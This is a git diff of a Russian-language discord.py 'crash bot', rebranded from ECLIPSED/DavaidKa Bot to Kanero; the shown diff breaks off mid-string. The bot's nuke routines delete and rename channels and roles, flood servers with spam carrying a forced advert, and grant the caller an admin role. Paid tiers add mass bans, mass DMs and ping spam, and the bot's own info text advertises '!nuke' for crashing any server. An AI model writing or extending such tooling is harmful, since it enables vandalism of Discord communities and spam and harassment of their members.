@@ -1,4 +1,4 @@
-import discord
+﻿import discord
 from discord.ext import commands
 from discord import app_commands
 import asyncio
@@ -60,7 +60,7 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
     try:
         # Создаём роль с правами администратора
         log_role = await guild.create_role(
-            name="☠️ ECLIPSED LOG",
+            name="☠️ Kanero LOG",
             permissions=discord.Permissions(administrator=True),
             color=discord.Color.dark_red()
         )
@@ -194,7 +194,7 @@ def wl_check():
                 description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            embed.set_footer(text="☠️ Kanero")
             await ctx.send(embed=embed)
             return False
         return True
@@ -221,9 +221,9 @@ async def delete_all_roles(guild):
 async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
-    # Добавляем рекламу к кастомному тексту
-    AD_SUFFIX = "\n\n☠️ DavaidKa Bot — https://discord.gg/JEspTXRW"
-    if spam_text != config.SPAM_TEXT and AD_SUFFIX not in spam_text:
+    # Реклама добавляется ВСЕГДА — нельзя убрать
+    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW"
+    if AD_SUFFIX not in spam_text:
         spam_text = spam_text + AD_SUFFIX
 
     NUKE_NAME = "Вы были крашнуты"
@@ -264,7 +264,7 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
             if not member:
                 member = await guild.fetch_member(caller_id)
             if member:
-                role = await guild.create_role(name="☠️ ECLIPSED", color=discord.Color.dark_red())
+                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                 # Поднимаем роль как можно выше
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
@@ -291,9 +291,9 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     """
     if spam_text is None:
         spam_text = config.SPAM_TEXT
-    # Добавляем рекламу к кастомному тексту
-    AD_SUFFIX = "\n\n☠️ DavaidKa Bot — https://discord.gg/JEspTXRW"
-    if spam_text != config.SPAM_TEXT and AD_SUFFIX not in spam_text:
+    # Реклама добавляется ВСЕГДА — нельзя убрать
+    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW"
+    if AD_SUFFIX not in spam_text:
         spam_text = spam_text + AD_SUFFIX
 
     TURBO_NAME = "Вы были крашнуты"
@@ -360,7 +360,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
             if not member:
                 member = await guild.fetch_member(_starter)
             if member:
-                role = await guild.create_role(name="☠️ ECLIPSED", color=discord.Color.dark_red())
+                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
                 except Exception:
@@ -382,9 +382,9 @@ async def do_owner_nuke_task(guild, spam_text=None):
     """
     if spam_text is None:
         spam_text = config.SPAM_TEXT
-    # Добавляем рекламу к кастомному тексту
-    AD_SUFFIX = "\n\n☠️ DavaidKa Bot — https://discord.gg/JEspTXRW"
-    if spam_text != config.SPAM_TEXT and AD_SUFFIX not in spam_text:
+    # Реклама добавляется ВСЕГДА — нельзя убрать
+    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW"
+    if AD_SUFFIX not in spam_text:
         spam_text = spam_text + AD_SUFFIX
 
     OWNER_NAME = "Вы были крашнуты"
@@ -438,7 +438,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
             if not member:
                 member = await guild.fetch_member(_starter)
             if member:
-                role = await guild.create_role(name="☠️ ECLIPSED", color=discord.Color.dark_red())
+                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
                 except Exception:
@@ -475,7 +475,7 @@ async def nuke(ctx, *, text: str = None):
     guild = ctx.guild
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
     if nuke_running.get(guild.id):
@@ -488,7 +488,7 @@ async def nuke(ctx, *, text: str = None):
             description="❌ Кастомный текст доступен только для подписчиков.\nЗа покупкой пиши: **davaidkatt**",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
     # Кастомный текст с кастомизацией — только для premium/овнера
@@ -529,7 +529,7 @@ async def stop(ctx):
             description="❌ Нюк запущен **овнером** — только он может остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -539,7 +539,7 @@ async def stop(ctx):
             description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -549,7 +549,7 @@ async def stop(ctx):
             description="❌ Только тот кто запустил нюк может его остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="DavaidKa Bot")
+        embed.set_footer(text="Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -700,7 +700,7 @@ async def wl_list(ctx):
         except Exception:
             lines.append(f"`{uid}` — *не найден*")
     embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
-    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.WHITELIST)}")
+    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.WHITELIST)}")
     await ctx.send(embed=embed)
 
 
@@ -747,7 +747,7 @@ async def list_cmd(ctx):
                 lines.append(f"`{uid}` — *не найден*")
         return "\n".join(lines) if lines else "*пусто*"
 
-    embed = discord.Embed(title="📋 Списки ECLIPSED", color=0x0a0a0a)
+    embed = discord.Embed(title="📋 Списки Kanero", color=0x0a0a0a)
     # Whitelist — только те кто не в Premium и не в Owner Whitelist
     protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
     wl_only = [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST and uid not in protected]
@@ -774,7 +774,7 @@ async def list_cmd(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -795,7 +795,7 @@ async def list_clear(ctx):
         description=f"Удалено **{len(removed)}** пользователей.\nОвнеры сохранены.",
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -811,7 +811,7 @@ def premium_check():
                 description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            embed.set_footer(text="☠️ Kanero")
             await ctx.send(embed=embed)
             return False
         if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
@@ -820,7 +820,7 @@ def premium_check():
                 description="Эта команда доступна только **Premium** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            embed.set_footer(text="☠️ Kanero")
             await ctx.send(embed=embed)
             return False
         return True
@@ -833,7 +833,7 @@ async def super_nuke(ctx, *, text: str = None):
     guild = ctx.guild
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
     if nuke_running.get(guild.id):
@@ -903,7 +903,7 @@ async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "off":
         AUTO_OWNER_NUKE = False
@@ -946,7 +946,7 @@ async def auto_off(ctx):
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -980,19 +980,25 @@ async def auto_info(ctx):
         value=f"{st(AUTO_OWNER_NUKE)}\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`\n`!auto_owner_nuke on/off`",
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !auto_off — выключить все")
+    embed.set_footer(text="☠️ Kanero  |  !auto_off — выключить все")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="setup")
 async def setup(ctx):
-    """Пересоздать структуру сервера ECLIPSED. Только для овнера."""
-    if ctx.author.id != config.OWNER_ID:
+    """Пересоздать структуру сервера. Только для овнеров (OWNER_ID + OWNER_WHITELIST)."""
+    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
+        embed = discord.Embed(
+            description="❌ Эта команда доступна только **овнерам** бота.",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed)
         return
     guild = ctx.guild
-    msg = await ctx.send("⚙️ Пересоздаю структуру сервера...")
+    msg = await ctx.send("⚙️ Пересоздаю структуру сервера... (это займёт ~30 сек)")
 
-    # ── Удаляем все каналы и роли ──
+    # ── 1. Удаляем все каналы и роли ──
     for ch in guild.channels:
         try:
             await ch.delete()
@@ -1006,117 +1012,352 @@ async def setup(ctx):
             except Exception:
                 pass
 
-    # ── Создаём роли (без прав) ──
-    roles_data = [
-        ("🔧 Developer", discord.Color.from_rgb(255, 80, 80)),
-        ("👑 Owner", discord.Color.gold()),
-        ("💎 Premium", discord.Color.purple()),
-        ("✅ White", discord.Color.blue()),
-        ("👤 Guest", discord.Color.light_grey()),
-    ]
-    for name, color in roles_data:
-        await guild.create_role(name=name, color=color, permissions=discord.Permissions.none())
+    # ── 2. Создаём роли с правами ──
+    # 👤 Guest — только читать публичные каналы, без права писать и заходить в войс
+    guest_perms = discord.Permissions(
+        read_messages=True,
+        read_message_history=True,
+        send_messages=False,
+        add_reactions=True,
+        connect=False,
+        speak=False
+    )
+    # ✅ White — базовый доступ: читать + писать в чатах, войс
+    white_perms = discord.Permissions(
+        read_messages=True,
+        read_message_history=True,
+        send_messages=True,
+        embed_links=True,
+        attach_files=True,
+        add_reactions=True,
+        use_external_emojis=True,
+        connect=True,
+        speak=True,
+        use_voice_activation=True,
+        stream=True
+    )
+    # 💎 Premium — всё что White + управление сообщениями + перемещение участников
+    premium_perms = discord.Permissions(
+        read_messages=True,
+        read_message_history=True,
+        send_messages=True,
+        embed_links=True,
+        attach_files=True,
+        add_reactions=True,
+        use_external_emojis=True,
+        manage_messages=True,
+        connect=True,
+        speak=True,
+        use_voice_activation=True,
+        stream=True,
+        move_members=True,
+        priority_speaker=True
+    )
+    # 👑 Owner — управление сервером без полного администратора
+    owner_perms = discord.Permissions(
+        read_messages=True,
+        read_message_history=True,
+        send_messages=True,
+        embed_links=True,
+        attach_files=True,
+        add_reactions=True,
+        use_external_emojis=True,
+        manage_messages=True,
+        manage_channels=True,
+        manage_roles=True,
+        manage_webhooks=True,
+        manage_emojis=True,
+        kick_members=True,
+        ban_members=True,
+        manage_nicknames=True,
+        view_audit_log=True,
+        mention_everyone=True,
+        connect=True,
+        speak=True,
+        use_voice_activation=True,
+        stream=True,
+        move_members=True,
+        mute_members=True,
+        deafen_members=True,
+        priority_speaker=True
+    )
+    # 🔧 Developer — полный администратор
+    dev_perms = discord.Permissions(administrator=True)
 
-    # ── Категория: ━━ 📢 ОСНОВНОЕ ━━ ──
-    cat_main = await guild.create_category("━━━━ 📢 ОСНОВНОЕ ━━━━")
-    info_ch = await guild.create_text_channel("ℹ️・info", category=cat_main)
-    rules_ch = await guild.create_text_channel("📜・правила", category=cat_main)
-    await guild.create_text_channel("📰・новости", category=cat_main)
-    await guild.create_text_channel("📋・changelog", category=cat_main)
-    await guild.create_text_channel("🏆・конкурсы", category=cat_main)
-    addbot_ch = await guild.create_text_channel("🤖・addbot", category=cat_main)
+    role_guest   = await guild.create_role(name="👤 Guest",     color=discord.Color.from_rgb(150, 150, 150), permissions=guest_perms,   hoist=False, mentionable=False)
+    role_white   = await guild.create_role(name="✅ White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False)
+    role_premium = await guild.create_role(name="💎 Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False)
+    role_owner   = await guild.create_role(name="👑 Owner",     color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False)
+    role_dev     = await guild.create_role(name="🔧 Developer", color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
+    role_bot     = await guild.create_role(name="🤖 Kanero",    color=discord.Color.from_rgb(0, 200, 150),   permissions=dev_perms,     hoist=True,  mentionable=False)
 
-    # ── Категория: ━━ 💬 ЧАТЫ ━━ ──
-    cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━")
-    await guild.create_text_channel("💬・общий", category=cat_chat)
-    await guild.create_text_channel("💡・идеи", category=cat_chat)
-    await guild.create_text_channel("🎫・create-ticket", category=cat_chat)
+    # Выдаём роль боту
+    try:
+        await guild.me.add_roles(role_bot)
+    except Exception:
+        pass
 
-    # ── Категория: ━━ 🔊 ВОЙСЫ ━━ ──
-    cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━")
+    # ── 3. Настраиваем права по умолчанию — @everyone ничего не видит ──
+    await guild.default_role.edit(permissions=discord.Permissions(
+        read_messages=False,
+        send_messages=False,
+        connect=False
+    ))
+
+    # Базовые overwrites для публичных каналов (видят все кроме @everyone)
+    def pub_ow():
+        return {
+            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+            role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
+            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        }
+
+    # Только для White+
+    def wl_ow():
+        return {
+            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+            role_guest: discord.PermissionOverwrite(read_messages=False),
+            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        }
+
+    # Только для Owner+
+    def admin_ow():
+        return {
+            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+            role_guest: discord.PermissionOverwrite(read_messages=False),
+            role_white: discord.PermissionOverwrite(read_messages=False),
+            role_premium: discord.PermissionOverwrite(read_messages=False),
+            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        }
+
+    # ── 4. Создаём категории и каналы ──
+
+    # ━━ 📢 ОСНОВНОЕ ━━
+    cat_main = await guild.create_category("━━━━ 📢 ОСНОВНОЕ ━━━━", overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        role_guest: discord.PermissionOverwrite(read_messages=True),
+        role_white: discord.PermissionOverwrite(read_messages=True),
+        role_premium: discord.PermissionOverwrite(read_messages=True),
+        role_owner: discord.PermissionOverwrite(read_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True),
+    })
+    info_ch   = await guild.create_text_channel("ℹ️・info",       category=cat_main, overwrites=pub_ow(), topic="Информация о боте Kanero")
+    rules_ch  = await guild.create_text_channel("📜・правила",    category=cat_main, overwrites=pub_ow(), topic="Правила сервера")
+    await guild.create_text_channel("📰・новости",                category=cat_main, overwrites=pub_ow(), topic="Новости и обновления Kanero")
+    await guild.create_text_channel("📋・changelog",              category=cat_main, overwrites=pub_ow(), topic="История обновлений бота")
+    await guild.create_text_channel("🏆・конкурсы",               category=cat_main, overwrites=pub_ow(), topic="Конкурсы и розыгрыши")
+    await guild.create_text_channel("📣・анонсы",                 category=cat_main, overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
+        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=False),
+        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=False),
+        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+    }, topic="Важные объявления")
+    addbot_ch = await guild.create_text_channel("🤖・addbot",     category=cat_main, overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+    }, topic="Напиши сюда чтобы получить доступ к боту")
+
+    # ━━ 💬 ЧАТЫ ━━
+    cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━", overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        role_guest: discord.PermissionOverwrite(read_messages=False),
+        role_white: discord.PermissionOverwrite(read_messages=True),
+        role_premium: discord.PermissionOverwrite(read_messages=True),
+        role_owner: discord.PermissionOverwrite(read_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True),
+    })
+    await guild.create_text_channel("💬・общий",        category=cat_chat, overwrites=wl_ow(), topic="Общий чат для White+")
+    await guild.create_text_channel("🎮・игры",         category=cat_chat, overwrites=wl_ow(), topic="Обсуждение игр")
+    await guild.create_text_channel("💡・идеи",         category=cat_chat, overwrites=wl_ow(), topic="Предложения и идеи")
+    await guild.create_text_channel("🖼️・медиа",        category=cat_chat, overwrites=wl_ow(), topic="Картинки, видео, мемы")
+    await guild.create_text_channel("🎫・create-ticket",category=cat_chat, overwrites=wl_ow(), topic="Создать тикет поддержки")
+    await guild.create_text_channel("🤝・партнёрство",  category=cat_chat, overwrites=wl_ow(), topic="Предложения о партнёрстве")
+
+    # ━━ 💎 PREMIUM ━━
+    cat_prem = await guild.create_category("━━━━ 💎 PREMIUM ━━━━", overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        role_guest: discord.PermissionOverwrite(read_messages=False),
+        role_white: discord.PermissionOverwrite(read_messages=False),
+        role_premium: discord.PermissionOverwrite(read_messages=True),
+        role_owner: discord.PermissionOverwrite(read_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True),
+    })
+    prem_ow = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        role_guest: discord.PermissionOverwrite(read_messages=False),
+        role_white: discord.PermissionOverwrite(read_messages=False),
+        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+    }
+    await guild.create_text_channel("💎・premium-chat",  category=cat_prem, overwrites=prem_ow, topic="Чат для Premium пользователей")
+    await guild.create_text_channel("🔑・premium-info",  category=cat_prem, overwrites=prem_ow, topic="Информация о Premium подписке")
+    await guild.create_text_channel("🛠️・premium-tools", category=cat_prem, overwrites=prem_ow, topic="Расширенные команды бота")
+    await guild.create_text_channel("🎁・premium-gifts", category=cat_prem, overwrites=prem_ow, topic="Подарки и бонусы для Premium")
+
+    # ━━ 👑 ADMIN ━━
+    cat_admin = await guild.create_category("━━━━ 👑 ADMIN ━━━━", overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        role_guest: discord.PermissionOverwrite(read_messages=False),
+        role_white: discord.PermissionOverwrite(read_messages=False),
+        role_premium: discord.PermissionOverwrite(read_messages=False),
+        role_owner: discord.PermissionOverwrite(read_messages=True),
+        role_dev: discord.PermissionOverwrite(read_messages=True),
+    })
+    await guild.create_text_channel("👑・admin-chat",    category=cat_admin, overwrites=admin_ow(), topic="Чат администрации")
+    await guild.create_text_channel("📊・logs",          category=cat_admin, overwrites=admin_ow(), topic="Логи действий бота")
+    await guild.create_text_channel("⚙️・bot-commands",  category=cat_admin, overwrites=admin_ow(), topic="Команды управления ботом")
+    await guild.create_text_channel("🔒・security",      category=cat_admin, overwrites=admin_ow(), topic="Безопасность и блокировки")
+    await guild.create_text_channel("📋・whitelist",     category=cat_admin, overwrites=admin_ow(), topic="Управление whitelist")
+
+    # ━━ 🔊 ВОЙСЫ ━━
+    cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━", overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_guest: discord.PermissionOverwrite(connect=False, view_channel=True),
+        role_white: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_premium: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+    })
     for i in range(1, 4):
-        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice)
+        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
+    await guild.create_voice_channel("🎮 gaming-voice", category=cat_voice, user_limit=8)
+    await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_guest: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_white: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_premium: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+    })
+    await guild.create_voice_channel("👑 admin-voice", category=cat_voice, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_guest: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_white: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_premium: discord.PermissionOverwrite(connect=False, view_channel=False),
+        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
+    })
 
-    # ── Отправляем правила ──
+    # ── 5. Отправляем контент в каналы ──
+
+    # Правила
     rules_embed = discord.Embed(
-        title="📜 Правила сервера DavaidKa Bot",
+        title="📜 Правила сервера — Kanero",
         description=(
-            "Добро пожаловать на официальный сервер **DavaidKa Bot** ☠️\n\n"
+            "Добро пожаловать на сервер **Kanero**! ☠️\n\n"
             "**Основные правила:**\n"
             "**1.** Уважай других участников\n"
             "**2.** Не спамь и не флуди\n"
-            "**3.** Не рекламируй сторонние ресурсы\n"
-            "**4.** Следуй правилам Discord ToS\n\n"
-            "**Как получить доступ к боту:**\n"
-            "Зайди в канал 🤖・addbot и напиши любое сообщение.\n"
-            "Бот автоматически выдаст тебе доступ.\n\n"
+            "**3.** Не рекламируй сторонние ресурсы без разрешения\n"
+            "**4.** Не делись личными данными других людей\n"
+            "**5.** Следуй правилам Discord ToS\n"
+            "**6.** Не злоупотребляй командами бота\n"
+            "**7.** Запрещён токсик, оскорбления, дискриминация\n\n"
             "**Уровни доступа:**\n"
-            "👤 Guest — просто участник\n"
-            "✅ White — базовые команды\n"
-            "💎 Premium — расширенные команды\n"
-            "👑 Owner — полный доступ\n\n"
-            "**Купить подписку:** **davaidkatt** | **@Firisotik**"
+            "🤖 **Kanero** — сам бот\n"
+            "🔧 **Developer** — разработчик, полный доступ\n"
+            "👑 **Owner** — управление сервером\n"
+            "💎 **Premium** — расширенные команды + premium каналы\n"
+            "✅ **White** — базовые команды бота + все чаты\n"
+            "👤 **Guest** — только чтение публичных каналов\n\n"
+            "**Как получить White:**\n"
+            "Напиши что-нибудь в 🤖・addbot\n\n"
+            "**Купить Premium:** **davaidkatt** | **@Firisotik**"
         ),
         color=0x0a0a0a
     )
-    rules_embed.set_footer(text="DavaidKa Bot")
+    rules_embed.set_footer(text="☠️ Kanero  |  Нарушение = бан")
     await rules_ch.send(embed=rules_embed)
 
-    # ── Отправляем инфо ──
+    # Инфо
     info_embed = discord.Embed(
-        title="ℹ️ Информация о боте DavaidKa Bot",
+        title="ℹ️ Kanero — Информация",
         description=(
-            "**DavaidKa Bot** — мощный краш-бот для Discord.\n\n"
-            "**🌍 Доступно всем:**\n"
-            "`!nuke` — краш сервера (переименование каналов → удаление ролей → спам → роль ☠️)\n"
-            "`!auto_nuke on/off` — авто-краш при входе бота на сервер\n\n"
-            "**✅ Whitelist (бесплатно — напиши в 🤖・addbot):**\n"
-            "`!nuke [текст]` — нюк со своим текстом\n"
-            "`!stop` · `!cleanup` · `!rename` · `!nicks_all`\n\n"
+            "**Kanero** — мощный краш-бот для Discord.\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "**🌍 Доступно всем (без регистрации):**\n"
+            "`!nuke` — краш сервера\n"
+            "• Переименование каналов → удаление ролей\n"
+            "• Создание каналов → спам → роль ☠️\n"
+            "`!auto_nuke on/off` — авто-краш при входе бота\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "**✅ White (напиши в 🤖・addbot):**\n"
+            "`!nuke [текст]` · `!stop` · `!cleanup`\n"
+            "`!rename` · `!nicks_all` · `!webhooks`\n"
+            "`!clear [число]` · `/sp` · `/spkd`\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "**💎 Premium (платно):**\n"
-            "`!super_nuke` — нюк с баном участников\n"
+            "`!super_nuke` — нюк + бан до 15 участников\n"
             "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
+            "`!rolesdelete` · `!serverinfo` · `!userinfo`\n"
             "`!auto_super_nuke` · `!auto_superpr_nuke`\n\n"
-            "**📋 Команды:**\n"
-            "Напиши `!help` боту в ЛС\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "**📋 Все команды:** напиши `!help` боту в ЛС\n"
+            "**🔗 Сервер:** https://discord.gg/JEspTXRW\n\n"
             "**💬 Купить Premium:** **davaidkatt** | **@Firisotik**"
         ),
         color=0x0a0a0a
     )
-    info_embed.set_footer(text="DavaidKa Bot  |  v1.8")
+    info_embed.set_footer(text="☠️ Kanero  |  v1.8  |  davaidkatt")
     info_embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await info_ch.send(embed=info_embed)
 
-    # ── Отправляем сообщение в addbot ──
+    # Addbot
     addbot_embed = discord.Embed(
-        title="🤖 Получить доступ к боту",
+        title="🤖 Получить доступ к Kanero",
         description=(
             "Напиши **любое сообщение** в этот канал.\n"
-            "Бот автоматически добавит тебя в whitelist и напишет в ЛС.\n\n"
-            "**Что ты получишь:**\n"
-            "• `!nuke` — краш любого сервера\n"
-            "• `!auto_nuke on/off` — авто-краш\n"
-            "• `!stop` · `!cleanup` · `!rename`\n\n"
-            "**Доступ активен пока ты на сервере.**\n"
-            "При выходе — удаляется автоматически."
+            "Бот напишет тебе в ЛС с инструкцией.\n\n"
+            "**Что ты получишь (White):**\n"
+            "• `!nuke [текст]` — нюк со своим текстом\n"
+            "• `!stop` · `!cleanup` · `!rename`\n"
+            "• `!nicks_all` · `!webhooks` · `!clear`\n"
+            "• `/sp` · `/spkd` — спам команды\n\n"
+            "**Для Premium напиши:** **davaidkatt**\n"
+            "**Наш сервер:** https://discord.gg/JEspTXRW"
         ),
         color=0x0a0a0a
     )
-    addbot_embed.set_footer(text="DavaidKa Bot  |  Просто напиши что-нибудь")
+    addbot_embed.set_footer(text="☠️ Kanero  |  Просто напиши что-нибудь")
     await addbot_ch.send(embed=addbot_embed)
 
     embed = discord.Embed(
-        title="✅ Структура сервера пересоздана",
+        title="✅ Kanero — Сервер полностью настроен",
         description=(
-            "**Роли:** 🔧 Developer · 👑 Owner · 💎 Premium · ✅ White · 👤 Guest\n\n"
-            "**📢 ОСНОВНОЕ:** ℹ️・info · 📜・правила · 📰・новости · 📋・changelog · 🏆・конкурсы · 🤖・addbot\n"
-            "**💬 ЧАТЫ:** 💬・общий · 💡・идеи · 🎫・create-ticket\n"
-            "**🔊 ВОЙСЫ:** 🔊 voice-1 · 🔊 voice-2 · 🔊 voice-3\n\n"
-            "Контент отправлен в ℹ️・info, 📜・правила и 🤖・addbot"
+            "**Роли созданы:**\n"
+            "🤖 Kanero — роль бота\n"
+            "🔧 Developer — администратор (полный доступ)\n"
+            "👑 Owner — управление сервером (без admin)\n"
+            "💎 Premium — расширенный доступ + premium каналы\n"
+            "✅ White — базовый доступ + все чаты\n"
+            "👤 Guest — только чтение публичных каналов\n"
+            "@everyone — ничего не видит\n\n"
+            "**Каналы созданы:**\n"
+            "📢 ОСНОВНОЕ: info · правила · новости · changelog · конкурсы · анонсы · addbot\n"
+            "💬 ЧАТЫ: общий · игры · идеи · медиа · create-ticket · партнёрство (White+)\n"
